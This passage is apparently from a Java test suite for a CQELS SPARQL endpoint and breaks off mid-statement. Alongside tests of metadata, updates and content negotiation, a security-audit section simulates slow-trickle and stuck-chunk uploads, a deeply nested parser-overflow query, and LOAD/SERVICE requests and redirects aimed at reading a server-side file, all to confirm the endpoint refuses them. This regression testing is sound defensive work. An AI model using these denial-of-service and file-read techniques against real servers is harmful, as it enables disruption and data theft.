    void metadataGraphListsStreamsWithTheirAttributes() throws Exception {
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("Telemetry", java.util.Map.of("unit", "km/h", "source", "can-bus"));
            e.engine().createStream("https://example.org/fleet/stream/soc");
            e.engine().createStream("fleet speed/raw");
            String streams = csv(e.url(), CQE + "SELECT ?s ?name FROM <" + META + "> WHERE { "
                    + "<cqels://endpoint/engine> cqe:stream ?s . ?s a cqe:Stream ; cqe:name ?name } ORDER BY ?name");
            assertTrue(streams.contains("cqels://streams/Telemetry,Telemetry"), streams);
            // an absolute IRI is the stream's node as it is; any other name is encoded under cqels://streams/
            assertTrue(streams.contains("https://example.org/fleet/stream/soc,https://example.org/fleet/stream/soc"), streams);
            assertTrue(streams.contains("cqels://streams/fleet%20speed%2Fraw,fleet speed/raw"), streams);
            String attrs = csv(e.url(), CQE + "SELECT ?k ?v FROM <" + META + "> WHERE { "
                    + "<cqels://streams/Telemetry> cqe:attribute [ cqe:key ?k ; cqe:value ?v ] } ORDER BY ?k");
            assertTrue(attrs.contains("source,can-bus") && attrs.contains("unit,km/h"), attrs);
        }
    }

    @Test
    void streamsWhoseNodesWouldCollideStayApart() throws Exception {
        // found in co-review of #121: both mapped to <cqels://streams/Telemetry>, and each
        // stream then appeared to carry the other's unit
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("Telemetry", java.util.Map.of("unit", "speed"));
            e.engine().createStream("cqels://streams/Telemetry", java.util.Map.of("unit", "temperature"));
            String rows = csv(e.url(), CQE + "SELECT ?name ?unit FROM <" + META + "> WHERE { "
                    + "?s cqe:name ?name ; cqe:attribute [ cqe:key \"unit\" ; cqe:value ?unit ] } ORDER BY ?name ?unit");
            assertEquals("name,unit\r\nTelemetry,speed\r\ncqels://streams/Telemetry,temperature\r\n", rows);
            assertTrue(ask(e.url(), CQE + "ASK FROM <" + META + "> { <cqels://streams/Telemetry> cqe:name \"cqels://streams/Telemetry\" }"));
        }
        // round 2: a stream named like the engine's node must not merge with the engine
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("cqels://endpoint/engine", java.util.Map.of("unit", "speed"));
            assertFalse(ask(e.url(), CQE + "ASK FROM <" + META + "> { ?s a cqe:Stream ; cqe:running ?r }"));
            assertFalse(ask(e.url(), CQE + "ASK FROM <" + META + "> { <cqels://endpoint/engine> cqe:attribute ?a }"));
            assertTrue(ask(e.url(), CQE + "ASK FROM <" + META + "> { <cqels://endpoint/engine> cqe:stream ?s . "
                    + "?s cqe:name \"cqels://endpoint/engine\" ; cqe:attribute [ cqe:value \"speed\" ] }"));
        }
    }

    @Test
    void metadataGraphCarriesTheEngineStatus() throws Exception {
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("S");
            e.engine().registerCqelsQuery("""
                    REGISTER QUERY Q AS
                    SELECT ?v FROM STREAM S [NOW] WHERE { STREAM S { ?v <urn:ex:p> ?o } }
                    """, row -> { });
            String status = csv(e.url(), CQE + "SELECT ?running ?queries ?persistence FROM NAMED <" + META + "> WHERE { "
                    + "GRAPH <" + META + "> { ?e a cqe:Engine ; cqe:running ?running ; cqe:registeredQueries ?queries ; "
                    + "cqe:persistence ?persistence ; cqe:snapshotAt ?at } }");
            assertTrue(status.contains("true,1,NO_PERSISTENCE"), status);
            // the protocol parameter selects the graph as FROM does
            var byParam = HTTP.send(HttpRequest.newBuilder(URI.create(e.url() + "?query="
                    + enc(CQE + "ASK { ?e cqe:running true }") + "&default-graph-uri=" + enc(META))).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertEquals(200, byParam.statusCode(), byParam.body());
            assertTrue(byParam.body().replace(" ", "").contains("\"boolean\":true"), byParam.body());
        }
    }

    @Test
    void metadataGraphIsASnapshotPerQuery() throws Exception {
        try (Endpoint e = withMetadata()) {
            String q = CQE + "ASK FROM <" + META + "> { ?s cqe:name \"Late\" }";
            assertFalse(ask(e.url(), q));
            e.engine().createStream("Late");
            assertTrue(ask(e.url(), q), "a stream created after the first query must show in the next");
            e.engine().removeStream("Late");
            assertFalse(ask(e.url(), q), "a removed stream must be gone from the next query");
        }
    }

    @Test
    void metadataGraphStaysOutOfTheStore() throws Exception {
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("Telemetry");
            assertTrue(ask(e.url(), CQE + "ASK FROM <" + META + "> { ?s a cqe:Stream }"));
            // not in the default graph every query without FROM sees — the engine's own included
            assertFalse(ask(e.url(), CQE + "ASK { ?s a cqe:Stream }"));
            try (RepositoryConnection c = e.engine().getRepository().getConnection()) {
                assertFalse(c.hasStatement(null, null, null, false, VF.createIRI(META)));
            }
            // so it cannot share a dataset with the store's graphs …
            var mixed = get(e.url(), "SELECT * FROM <" + META + "> FROM <urn:ex:g1> WHERE { ?s ?p ?o }", null);
            assertEquals(400, mixed.statusCode(), mixed.body());
            assertTrue(mixed.body().contains("on its own"), mixed.body());
            // … and GRAPH <meta> without the dataset naming it says so instead of answering empty
            var unnamed = get(e.url(), "SELECT * WHERE { GRAPH <" + META + "> { ?s ?p ?o } }", null);
            assertEquals(400, unnamed.statusCode(), unnamed.body());
            assertTrue(unnamed.body().contains("FROM NAMED"), unnamed.body());
            // RDF4J's algebra keeps no trace of a GRAPH clause that reads no triples, so the
            // check reads the syntax tree: found in co-review of #121, where these answered 200
            for (String q : List.of(
                    "ASK { GRAPH <" + META + "> { BIND(1 AS ?x) } }",
                    "ASK { GRAPH <" + META + "> { } }",
                    "SELECT * WHERE { ?v <urn:ex:depot> ?d GRAPH <" + META + "> { VALUES ?x { 1 } } }",
                    "PREFIX m: <cqels://endpoint/> ASK { GRAPH m:metadata { BIND(1 AS ?x) } }",
                    "BASE <cqels://endpoint/> ASK { GRAPH <metadata> { BIND(1 AS ?x) } }",
                    "ASK { FILTER EXISTS { GRAPH <" + META + "> { BIND(1 AS ?x) } } }")) {
                var r = get(e.url(), q, null);
                assertEquals(400, r.statusCode(), q + " -> " + r.body());
            }
        }
    }

    @Test
    void metadataGraphIsRefusedWhenNotEnabled() throws Exception {
        assertFalse(EndpointOptions.defaults().metadataEnabled());
        var r = get(shared.url(), "ASK FROM <" + META + "> { ?s ?p ?o }", null);
        assertEquals(403, r.statusCode(), r.body());
        assertTrue(r.body().contains("CQELS_SPARQL_METADATA_ENABLED"), r.body());
    }

    @Test
    void updatesCannotWriteTheMetadataGraph() throws Exception {
        try (Endpoint e = withMetadata()) {
            String form = "application/x-www-form-urlencoded";
            for (String update : List.of(
                    "INSERT DATA { GRAPH <" + META + "> { <urn:ex:a> <urn:ex:b> <urn:ex:c> } }",
                    // the prefixed form hides the IRI from the parse of INSERT DATA; the effect still shows it
                    "PREFIX x: <cqels://endpoint/> INSERT DATA { GRAPH x:metadata { <urn:ex:a> <urn:ex:b> <urn:ex:c> } }",
                    // WITH scopes the WHERE to that graph too, hence the empty pattern: one solution
                    "WITH <" + META + "> INSERT { <urn:ex:a> <urn:ex:b> <urn:ex:c> } WHERE { }",
                    "ADD <urn:ex:g1> TO <" + META + ">")) {
                var r = post(e.url(), form, "update=" + enc(update), null);
                assertEquals(403, r.statusCode(), update + " -> " + r.body());
                assertTrue(r.body().contains("reserved"), r.body());
            }
            try (RepositoryConnection c = e.engine().getRepository().getConnection()) {
                assertFalse(c.hasStatement(null, null, null, false, VF.createIRI(META)), "a refused update was not undone");
            }
            // any other graph is writable as before
            var ok = post(e.url(), form, "update=" + enc("INSERT DATA { GRAPH <urn:ex:g3> { <urn:ex:a> <urn:ex:b> <urn:ex:c> } }"), null);
            assertEquals(204, ok.statusCode(), ok.body());

            // Triples put there behind the endpoint's back block every update that leaves them,
            // and an update that removes them is accepted.
            try (RepositoryConnection c = e.engine().getRepository().getConnection()) {
                c.add(iri("x"), iri("y"), iri("z"), VF.createIRI(META));
            }
            var blocked = post(e.url(), form, "update=" + enc("INSERT DATA { <urn:ex:a> <urn:ex:b> <urn:ex:d> }"), null);
            assertEquals(403, blocked.statusCode(), blocked.body());
            assertFalse(ask(e.url(), "ASK { <urn:ex:a> <urn:ex:b> <urn:ex:d> }"), "the blocked update must be undone");
            var cleared = post(e.url(), form, "update=" + enc("CLEAR GRAPH <" + META + ">"), null);
            assertEquals(204, cleared.statusCode(), cleared.body());
        }
    }

    // ---- the audit after #121: resources and outbound requests ------------------------------

    /**
     * A POST whose body trickles in used to hold a request thread the slots never counted, so
     * with enough of them neither the 503 nor /health answered. It now holds a slot: the next
     * request is turned away at once, /health answers, and the upload deadline gives the slot back.
     */
    @Test
    void aSlowUploadHoldsASlotNotAThreadAndIsCutOff() throws Exception {
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withMaxConcurrentQueries(1).withMaxUploadSeconds(2), 0);
             java.net.Socket slow = new java.net.Socket("127.0.0.1", URI.create(ep.url()).getPort())) {
            var out = slow.getOutputStream();
            out.write(("POST /sparql HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/sparql-query\r\n"
                    + "Content-Length: 1000\r\n\r\nASK").getBytes(StandardCharsets.US_ASCII));
            out.flush();
            String ask = ep.url() + "?query=" + enc("ASK {}");
            HttpResponse<String> busy = null;
            for (int i = 0; i < 50 && (busy == null || busy.statusCode() != 503); i++) {   // until the upload holds the slot
                busy = getWithin(ask, java.time.Duration.ofSeconds(2));
            }
            assertEquals(503, busy.statusCode(), "the trickling upload never held the slot");
            String base = ep.url().substring(0, ep.url().length() - "/sparql".length());
            assertEquals(200, getWithin(base + "/health", java.time.Duration.ofSeconds(2)).statusCode());
            // keep trickling, a byte every 300 ms, until the server answers
            slow.setSoTimeout(15_000);
            var in = new java.io.BufferedReader(new java.io.InputStreamReader(slow.getInputStream(), StandardCharsets.US_ASCII));
            Thread trickle = new Thread(() -> {
                try {
                    for (int i = 0; i < 40; i++) {
                        Thread.sleep(300);
                        out.write(' ');
                        out.flush();
                    }
                } catch (Exception ignored) {
                    // the server closed the connection: done
                }
            });
            trickle.setDaemon(true);
            long t0 = System.nanoTime();
            trickle.start();
            String status = in.readLine();
            assertTrue(status != null && status.contains(" 408 "), "status line: " + status);
            assertTrue((System.nanoTime() - t0) / 1e9 < 8, "the deadline took too long");
            assertEquals(200, getWithin(ask, java.time.Duration.ofSeconds(5)).statusCode(), "the slot was not given back");
        }
    }

    /** 2,000 nested parentheses (4 KB) overflowed RDF4J's parser into Jetty's HTML error page. */
    @Test
    void aDeeplyNestedQueryIs400NotAStackOverflowPage() throws Exception {
        String deep = "SELECT (" + "(".repeat(2000) + "1" + ")".repeat(2000) + " AS ?x) WHERE {}";
        var r = post(shared.url(), "application/sparql-query", deep, null);
        assertEquals(400, r.statusCode(), r.body());
        assertTrue(type(r).startsWith("text/plain"), type(r));
        assertTrue(r.body().contains("nests too deeply"), r.body());
        assertFalse(r.body().contains("Jetty"), r.body());
        assertEquals(200, get(shared.url(), "ASK {}", null).statusCode());   // and the slot came back
    }

    /** An OutOfMemoryError gets a plain answer and gives its slot back; the supplier stands in for a heap blow-up. */
    @Test
    void runningOutOfHeapIsAnsweredAndTheSlotReturned() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        java.util.concurrent.atomic.AtomicInteger calls = new java.util.concurrent.atomic.AtomicInteger();
        java.util.function.Supplier<org.eclipse.rdf4j.repository.Repository> blowsUpOnce = () -> {
            if (calls.getAndIncrement() == 0) {
                throw new OutOfMemoryError("stand-in for a GROUP BY that filled the heap");
            }
            return engine.getRepository();
        };
        Server server = SparqlEndpointLauncher.startServer(blowsUpOnce, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(1), 64, false);
        try {
            String url = "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort() + "/sparql";
            var r = get(url, "ASK {}", null);
            assertEquals(500, r.statusCode(), r.body());
            assertTrue(type(r).startsWith("text/plain"), type(r));
            assertTrue(r.body().contains("ran out of server memory"), r.body());
            assertEquals(200, get(url, "ASK {}", null).statusCode(), "the slot was not given back");
        } finally {
            server.stop();
            engine.close();
        }
    }

    /**
     * {@code maxRows} capped rows, not memory: one computed literal was an 8 MB row under
     * {@code maxRows=1}. The buffer now stops at {@code maxBufferedBytes} too — and the cap covers
     * CONSTRUCT and DESCRIBE, which streamed whatever it said.
     */
    @Test
    void theRowCapAlsoBoundsBytesAndGraphResults() throws Exception {
        try (Endpoint capped = Endpoint.start(EndpointOptions.defaults().withMaxRows(1000).withMaxBufferedBytes(50_000), 10)) {
            // each row carries a 10,000-character string (about 20 KB estimated): two fit, the third does not
            var big = post(capped.url(), "application/sparql-query", "SELECT ?s (CONCAT(STR(?s), \"" + "x".repeat(10_000)
                    + "\") AS ?big) WHERE { ?s <urn:ex:v> ?x }", "text/csv");
            assertEquals(200, big.statusCode(), big.body());
            assertEquals("true", big.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
            assertEquals(3, big.body().strip().split("\n").length);   // header + 2 rows
            // a long datatype IRI counts too: it passed as 66 bytes
            var typed = post(capped.url(), "application/sparql-query", "SELECT (STRDT(\"x\", IRI(CONCAT(\"urn:\", STR(?x), \""
                    + "d".repeat(10_000) + "\"))) AS ?t) WHERE { ?s <urn:ex:v> ?x }", "text/csv");
            assertEquals(200, typed.statusCode(), typed.body());
            assertEquals("true", typed.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
            var small = get(capped.url(), "SELECT ?s WHERE { ?s <urn:ex:v> ?x }", "text/csv");
            assertTrue(small.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).isEmpty(), "10 small rows fit");
        }
        try (Endpoint capped = Endpoint.start(EndpointOptions.defaults().withMaxRows(2), 10)) {
            var graph = get(capped.url(), "CONSTRUCT { ?s <urn:ex:v> ?x } WHERE { ?s <urn:ex:v> ?x }", "application/n-triples");
            assertEquals(200, graph.statusCode(), graph.body());
            assertEquals("true", graph.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
            assertEquals(2, graph.body().strip().split("\n").length, graph.body());
            var turtle = get(capped.url(), "CONSTRUCT { ?v <urn:ex:depot> <urn:ex:North> } WHERE { ?v <urn:ex:depot> <urn:ex:North> }", null);
            assertTrue(turtle.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).isEmpty());
            assertTrue(turtle.body().contains("EV-7Q2"), turtle.body());
        }
    }

    @Test
    void constructIsAvailableAsRdfXmlAndJsonLd() throws Exception {
        String q = "CONSTRUCT { ?v <urn:ex:depot> ?d } WHERE { ?v <urn:ex:depot> ?d }";
        for (String type : List.of("application/rdf+xml", "application/ld+json")) {
            var r = get(shared.url(), q, type);
            assertEquals(200, r.statusCode(), type + ": " + r.body());
            assertTrue(type(r).startsWith(type), type(r));
            assertTrue(r.body().contains("EV-7Q2"), r.body());
        }
    }

    /** A tiny HTTP server answering each path with a handler. */
    static com.sun.net.httpserver.HttpServer serve(java.util.Map<String, com.sun.net.httpserver.HttpHandler> paths)
            throws IOException {
        var server = com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1", 0), 0);
        paths.forEach(server::createContext);
        server.setExecutor(java.util.concurrent.Executors.newCachedThreadPool());
        server.start();
        return server;
    }

    static com.sun.net.httpserver.HttpHandler respond(int status, String type, String body, long delayMillis,
                                                      String... headers) {
        return ex -> {
            try {
                Thread.sleep(delayMillis);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
            ex.getResponseHeaders().add("Content-Type", type);
            for (int i = 0; i + 1 < headers.length; i += 2) {
                ex.getResponseHeaders().add(headers[i], headers[i + 1]);
            }
            ex.sendResponseHeaders(status, bytes.length == 0 ? -1 : bytes.length);
            ex.getResponseBody().write(bytes);
            ex.close();
        };
    }

    static String base(com.sun.net.httpserver.HttpServer s) {
        return "http://127.0.0.1:" + s.getAddress().getPort();
    }

    /** With federation on, {@code LOAD <file:…>} read an RDF file off the server's disk into the store. */
    @Test
    void federationNamesOnlyHttpTargets(@org.junit.jupiter.api.io.TempDir java.nio.file.Path dir) throws Exception {
        java.nio.file.Path secret = dir.resolve("secret.ttl");
        java.nio.file.Files.writeString(secret, "<urn:ex:secret> <urn:ex:p> \"server-side file\" .\n");
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true), 0)) {
            var load = post(fed.url(), "application/sparql-update", "LOAD <" + secret.toUri() + ">", null);
            assertEquals(403, load.statusCode(), load.body());
            assertTrue(load.body().contains("http and https"), load.body());
            assertFalse(get(fed.url(), "ASK { <urn:ex:secret> ?p ?o }", null).body().replace(" ", "").contains("true"));
            var service = get(fed.url(), "SELECT * WHERE { SERVICE <" + secret.toUri() + "> { ?s ?p ?o } }", null);
            assertEquals(403, service.statusCode(), service.body());
            var upper = post(fed.url(), "application/sparql-update", "LOAD <FILE:" + secret.toUri().getPath() + ">", null);
            assertEquals(403, upper.statusCode(), upper.body());
        }
    }

    /** RDF4J's SERVICE client had no socket timeout, so a stalled remote held the slot past the execution limit. */
    @Test
    void aStalledServiceIs504WithinTheLimit() throws Exception {
        var remote = serve(java.util.Map.of("/sparql", respond(200, "application/sparql-results+json",
                "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 5_000)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMaxExecutionSeconds(1), 0)) {
            long t0 = System.nanoTime();
            var r = get(fed.url(), "SELECT * WHERE { SERVICE <" + base(remote) + "/sparql> { ?s ?p ?o } }", null);
            double took = (System.nanoTime() - t0) / 1e9;
            assertEquals(504, r.statusCode(), r.body());
            assertTrue(took < 4, "took " + took + " s");
        } finally {
            remote.stop(0);
        }
    }

    /**
     * LOAD is performed by the servlet: RDF4J's loader followed a redirect into a local file and
     * waited without a deadline. Redirects to http(s) still work; anything else is refused.
     */
    @Test
    void loadIsBoundedAndFollowsOnlyHttpRedirects(@org.junit.jupiter.api.io.TempDir java.nio.file.Path dir) throws Exception {
        java.nio.file.Path secret = dir.resolve("secret.ttl");
        java.nio.file.Files.writeString(secret, "<urn:ex:secret> <urn:ex:p> \"server-side file\" .\n");
        var remote = serve(java.util.Map.of(
                "/data.ttl", respond(200, "text/turtle", "<urn:ex:loaded> <urn:ex:p> \"fetched\" .\n", 0),
                "/elsewhere", respond(200, "application/n-triples", "<urn:ex:moved> <urn:ex:p> \"followed\" .\n", 0),
                "/moved", respond(302, "text/plain", "", 0, "Location", "/elsewhere"),
                "/redirect.ttl", respond(302, "text/plain", "", 0, "Location", secret.toUri().toString()),
                "/stalled.ttl", respond(200, "text/turtle", "<urn:ex:late> <urn:ex:p> 1 .\n", 6_000),
                "/missing.ttl", respond(404, "text/plain", "no", 0)));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true)
                .withMaxExecutionSeconds(2), 0)) {
            String r = base(remote);
            assertEquals(204, post(ep.url(), "application/sparql-update", "LOAD <" + r + "/data.ttl>", null).statusCode());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:loaded> ?p ?o }"));
            assertEquals(204, post(ep.url(), "application/sparql-update", "LOAD <" + r + "/moved> INTO GRAPH <urn:ex:g9>", null).statusCode());
            assertTrue(ask(ep.url(), "ASK { GRAPH <urn:ex:g9> { <urn:ex:moved> ?p ?o } }"), "an http redirect is followed, into the named graph");

            var toFile = post(ep.url(), "application/sparql-update", "LOAD <" + r + "/redirect.ttl>", null);
            assertEquals(502, toFile.statusCode(), toFile.body());
            assertFalse(ask(ep.url(), "ASK { <urn:ex:secret> ?p ?o }"), "LOAD followed a redirect into a local file");

            long t0 = System.nanoTime();
            var stalled = post(ep.url(), "application/sparql-update", "LOAD <" + r + "/stalled.ttl>", null);
            double took = (System.nanoTime() - t0) / 1e9;
            assertEquals(504, stalled.statusCode(), stalled.body());
            assertTrue(took < 5, "took " + took + " s");

            assertEquals(502, post(ep.url(), "application/sparql-update", "LOAD <" + r + "/missing.ttl>", null).statusCode());
            assertEquals(204, post(ep.url(), "application/sparql-update", "LOAD SILENT <" + r + "/missing.ttl>", null).statusCode());
            var mixed = post(ep.url(), "application/sparql-update",
                    "LOAD <" + r + "/data.ttl> ; INSERT DATA { <urn:ex:a> <urn:ex:b> <urn:ex:c> }", null);
            assertEquals(400, mixed.statusCode(), mixed.body());
            var reserved = post(ep.url(), "application/sparql-update", "LOAD <" + r + "/data.ttl> INTO GRAPH <" + META + ">", null);
            assertEquals(403, reserved.statusCode(), reserved.body());
        } finally {
            remote.stop(0);
        }
    }

    /**
     * A chunked body whose framing never yields a byte — a chunk extension sent a character at a
     * time — kept the slot past the deadline, the traffic keeping the idle timeout away.
     */
    @Test
    void aBodyStuckInChunkFramingIsCutOffAtTheDeadline() throws Exception {
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withMaxConcurrentQueries(1).withMaxUploadSeconds(2), 0);
             java.net.Socket slow = new java.net.Socket("127.0.0.1", URI.create(ep.url()).getPort())) {
            var out = slow.getOutputStream();
            out.write(("POST /sparql HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/sparql-query\r\n"
                    + "Transfer-Encoding: chunked\r\n\r\n3\r\nASK\r\n1;ext=").getBytes(StandardCharsets.US_ASCII));
            out.flush();
            slow.setSoTimeout(15_000);
            var in = new java.io.BufferedReader(new java.io.InputStreamReader(slow.getInputStream(), StandardCharsets.US_ASCII));
            Thread trickle = new Thread(() -> {
                try {
                    for (int i = 0; i < 40; i++) {
                        Thread.sleep(300);
                        out.write('a');
                        out.flush();
                    }
                } catch (Exception ignored) {
                    // the server closed the connection: done
                }
            });
            trickle.setDaemon(true);
            long t0 = System.nanoTime();
            trickle.start();
            String status = in.readLine();
            assertTrue(status != null && status.contains(" 408 "), "status line: " + status);
            assertTrue((System.nanoTime() - t0) / 1e9 < 8, "the deadline took too long");
            assertEquals(200, getWithin(ep.url() + "?query=" + enc("ASK {}"), java.time.Duration.ofSeconds(5)).statusCode(),
                    "the slot was not given back, or the interrupt leaked into the next request");
        }
    }

    /** A metadata query made its own SERVICE resolver, with RDF4J's untimed client. */
    @Test
    void serviceInAMetadataQueryHasTheDeadlineToo() throws Exception {
        var remote = serve(java.util.Map.of(
                "/slow", respond(200, "application/sparql-results+json", "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 5_000),
                "/fast", respond(200, "application/sparql-results+json", "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 0)));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMetadataEnabled(true)
                .withMaxExecutionSeconds(1), 0)) {
            long t0 = System.nanoTime();
            var r = get(ep.url(), "SELECT * FROM <" + META + "> WHERE { SERVICE <" + base(remote) + "/slow> { ?s ?p ?o } }", null);
            assertEquals(504, r.statusCode(), r.body());
            assertTrue((System.nanoTime() - t0) / 1e9 < 4);
            // the snapshot's shutdown left the shared resolver working
            var after = get(ep.url(), "SELECT * WHERE { SERVICE <" + base(remote) + "/fast> { ?s ?p ?o } }", null);
            assertEquals(200, after.statusCode(), after.body());
        } finally {
            remote.stop(0);
        }
    }

    /**
     * Stopping Jetty closed the SERVICE client but left it installed, so a restart broke
     * federation; and handing RDF4J's client back on stop would have left the engine a closed one.
     */
    @Test
    void federationSurvivesAJettyRestart() throws Exception {
        var remote = serve(java.util.Map.of("/fast", respond(200, "application/sparql-results+json",
                "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 0)));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            String q = "SELECT * WHERE { SERVICE <" + base(remote) + "/fast> { ?s ?p ?o } }";
            assertEquals(200, get(ep.url(), q, null).statusCode());
            ep.server().stop();
            ep.server().start();
            String url = "http://127.0.0.1:" + ((ServerConnector) ep.server().getConnectors()[0]).getLocalPort() + "/sparql";
            var again = get(url, q, null);
            assertEquals(200, again.statusCode(), again.body());
            // and once the endpoint stops, the engine's own resolver still works
            ep.server().stop();
            try (RepositoryConnection c = ep.engine().getRepository().getConnection();
                 var rows = c.prepareTupleQuery(q).evaluate()) {
                assertFalse(rows.hasNext());
            }
        } finally {
            remote.stop(0);
        }
    }

    // ---- start-up refusal -------------------------------------------------------------------

    @Test
    void remoteBindWithoutTokenIsRefused() {
        assertThrows(IllegalStateException.class,
                () -> SparqlEndpointLauncher.requireTokenForRemoteBind("0.0.0.0", null, false));
        SparqlEndpointLauncher.requireTokenForRemoteBind("0.0.0.0", "t", false);
        SparqlEndpointLauncher.requireTokenForRemoteBind("0.0.0.0", null, true);
        SparqlEndpointLauncher.requireTokenForRemoteBind("127.0.0.1", null, false);
        SparqlEndpointLauncher.requireTokenForRemoteBind("localhost", null, false);
    }

    /** The refusal was in main only, so a program embedding through startServer opened an unauthenticated 0.0.0.0. */
    @Test
    void startServerItselfRefusesAnUnauthenticatedRemoteBind() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        try {
            var e = assertThrows(IllegalStateException.class, () -> SparqlEndpointLauncher.startServer(engine,
                    "0.0.0.0", 0, EndpointOptions.defaults(), 64, false));
            assertTrue(e.getMessage().contains("CQELS_SPARQL_AUTH_TOKEN"), e.getMessage());
            assertThrows(IllegalStateException.class, () -> SparqlEndpointLauncher.startServer(engine::getRepository,
                    null, "0.0.0.0", 0, EndpointOptions.defaults(), 64, false));
            // no host is every interface to Jetty, so it is not loopback either
            assertThrows(IllegalStateException.class, () -> SparqlEndpointLauncher.startServer(engine,
                    null, 0, EndpointOptions.defaults(), 64, false));
        } finally {
            engine.close();
        }
    }

    @Test
    void negotiationHelper() {
        var reg = org.eclipse.rdf4j.query.resultio.TupleQueryResultWriterRegistry.getInstance();
        org.eclipse.rdf4j.query.resultio.QueryResultFormat json = org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.JSON;
        var csv = org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.CSV;
        var tsv = org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.TSV;
        assertEquals(json, SparqlProtocolServlet.negotiate(null, reg, json).orElseThrow().format());
        assertEquals("application/sparql-results+json", SparqlProtocolServlet.negotiate("*/*", reg, json).orElseThrow().mediaType());
        assertEquals(csv, SparqlProtocolServlet.negotiate("text/csv", reg, json).orElseThrow().format());
        assertTrue(SparqlProtocolServlet.negotiate("image/png", reg, json).isEmpty());
        assertTrue(SparqlProtocolServlet.negotiate("text/*", reg, json).isPresent());
        // q=0 is an exclusion the wildcard must not override (RFC 9110 §12.5.1) — of that media
        // type; JSON's other alias is still acceptable through */* and labels the response
        var n = SparqlProtocolServlet.negotiate("application/sparql-results+json;q=0, */*", reg, json).orElseThrow();
        assertFalse(n.mediaType().equals("application/sparql-results+json"), n.toString());
        assertTrue(SparqlProtocolServlet.negotiate("*/*;q=0", reg, json).isEmpty());
        // excluding one alias leaves an explicitly accepted one
        n = SparqlProtocolServlet.negotiate("application/json;q=0, application/sparql-results+json", reg, json).orElseThrow();
        assertEquals("application/sparql-results+json", n.mediaType());
        n = SparqlProtocolServlet.negotiate("application/json", reg, json).orElseThrow();
        assertEquals(json, n.format());
        assertEquals("application/json", n.mediaType());
        // parameters: q is case-insensitive; a range with parameters is more specific, and matches
        // only what the writer produces (CSV is UTF-8)
        assertTrue(SparqlProtocolServlet.negotiate("application/sparql-results+json;Q=0", reg, json).isEmpty());
        assertEquals("text/csv", SparqlProtocolServlet.negotiate("text/csv;q=0, text/csv;charset=UTF-8", reg, json)
                .orElseThrow().mediaType());
        assertTrue(SparqlProtocolServlet.negotiate("text/csv;charset=ISO-8859-1", reg, json).isEmpty());
        assertTrue(SparqlProtocolServlet.negotiate("text/csv;charset=utf-8;q=0.5", reg, json).isPresent());
        // equal q: the more specific range wins, then the one listed first
        assertEquals(tsv, SparqlProtocolServlet.negotiate("*/*, text/tab-separated-values", reg, json).orElseThrow().format());
        assertEquals(csv, SparqlProtocolServlet.negotiate("text/csv, application/sparql-results+json", reg, json).orElseThrow().format());
    }

    @Test
    void repeatedAcceptFieldsAreOneList() throws Exception {
        var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("ASK {}")))
                .header("Accept", "image/png").header("Accept", "application/sparql-results+xml").build(),
                HttpResponse.BodyHandlers.ofString());
        assertEquals(200, r.statusCode(), r.body());
        assertTrue(type(r).startsWith("application/sparql-results+xml"), type(r));
        var excluded = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("SELECT * WHERE {}")))
                .header("Accept", "*/*").header("Accept", "application/sparql-results+json;q=0").build(),
                HttpResponse.BodyHandlers.ofString());
        assertEquals(200, excluded.statusCode());
        assertFalse(type(excluded).startsWith("application/sparql-results+json"), type(excluded));
    }

    @Test
    void formBodyDecodesInItsDeclaredCharset() throws Exception {
        // %E9 is é in ISO-8859-1 and an invalid byte in UTF-8
        var r = post(shared.url(), "application/x-www-form-urlencoded; charset=ISO-8859-1",
                "query=SELECT+%28%22caf%E9%22+AS+%3Fx%29+WHERE+%7B%7D", "text/csv");
        assertEquals(200, r.statusCode(), r.body());
        assertTrue(r.body().contains("café"), r.body());
        var utf8 = post(shared.url(), "application/x-www-form-urlencoded",
                "query=SELECT+%28%22caf%C3%A9%22+AS+%3Fx%29+WHERE+%7B%7D", "text/csv");
        assertTrue(utf8.body().contains("café"), utf8.body());
        // Shift_JIS テスト is 83 65 83 58 83 67: the trailing bytes are ASCII e, X, g, so a form
        // encoder leaves them unescaped and they must join the escaped lead bytes
        var sjis = post(shared.url(), "application/x-www-form-urlencoded; charset=Shift_JIS",
